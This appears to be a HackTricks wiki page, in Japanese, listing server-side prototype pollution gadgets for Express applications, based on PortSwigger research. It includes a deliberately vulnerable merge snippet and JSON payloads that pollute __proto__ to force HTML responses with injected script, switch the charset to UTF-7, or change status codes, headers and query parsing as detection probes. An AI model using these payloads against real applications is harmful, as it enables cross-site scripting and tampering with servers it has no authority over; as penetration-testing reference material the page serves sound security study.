# Express Prototype Pollution Gadgets

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)をフォローする
- **ハッキングトリックを共有するために、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する**

</details>

## Serve XSS responses

**詳細については、[元のリサーチを参照してください](https://portswigger.net/research/server-side-prototype-pollution)**

### JSONコンテンツタイプをHTMLに変更

**JSONコンテンツタイプのレスポンス**を使用し、JSONを反映しているExpressアプリ内で：
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
これらのケースでは、JSONコンテンツタイプでは通常XSSは可能ではありません。ただし、プロトタイプ汚染を使用すると、**Expressを混乱させてHTMLレスポンスを提供させることができます。** この脆弱性は、アプリケーションが**`res.send(obj)`**を使用し、application/jsonコンテンツタイプでボディパーサーを使用していることに依存しています。
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
**`body`**および**`_body`**プロパティを**汚染**することで、**ExpressがHTMLコンテンツタイプを提供**し、_bodyプロパティを反映させ、保存されたXSSが発生する可能性があります。

### UTF7のレンダリング

Expressが**UTF-7コンテンツをレンダリングする**ことが可能です：
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## 安全なスキャン技術

### JSON スペース

次の PP は、JSON 内の属性に余分なスペースを追加し、機能を壊さないようにします：
```json
{"__proto__":{"json spaces": " "}}
```
その後、反映されたJSONは次のようになります：
```json
{"foo":  "bar"} -- Note the extra space
```
### 公開されたヘッダー

次のPPガジェットにより、サーバーはHTTPヘッダーを送信します: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
**CORSモジュールのインストールが必要です**

### **OPTIONSメソッド**

次のペイロードを使用すると、**OPTIONSレスポンスからメソッドを隠す**ことが可能です：
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **ステータス**

以下のPPペイロードを使用して、**返されるステータスコード**を変更することが可能です：
```json
{"__proto__":{"status":510}}
```
### エラー

プロトタイプに文字列などのプリミティブを割り当てると、プロトタイプはオブジェクトである必要があるため、**no-op操作が生成**されます。`Object.prototype`にプロトタイプオブジェクトを割り当てようとすると、これは**例外をスロー**します。これら2つの動作を使用して、**プロトタイプ汚染が成功したかどうかを検出**できます。
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### 反射された値

アプリケーションがレスポンスにオブジェクトを含める場合、**`__proto__`と一緒に異常な名前の属性を作成**すると興味深いです。特に、レスポンスに**異常な属性だけが返される**場合、これはアプリケーションの脆弱性を示している可能性があります：
```json
{"unusualName":"value","__proto__":"test"}
```
また、Lodashのようなライブラリが使用されているシナリオでは、プロトタイプ汚染（PP）を介してプロパティを設定することと、オブジェクト内で直接設定することの両方が別の診断アプローチを提供します。応答からそのようなプロパティが省略されている場合、Lodashはマージする前に対象オブジェクト内のプロパティの存在を検証していることを示唆しています：
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## その他

### ドットを許可

Expressには、**クエリ文字列パラメータからオブジェクトを作成する**オプションがあります。\
これは、**プロトタイプ汚染の脆弱性を悪用する**ためのバグ**チェーン**で利用できます。
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz`はNodeでオブジェクトを作成します。**

## 参考文献

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)で**フォロー**する
* **HackTricks**および**HackTricks Cloud**のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>
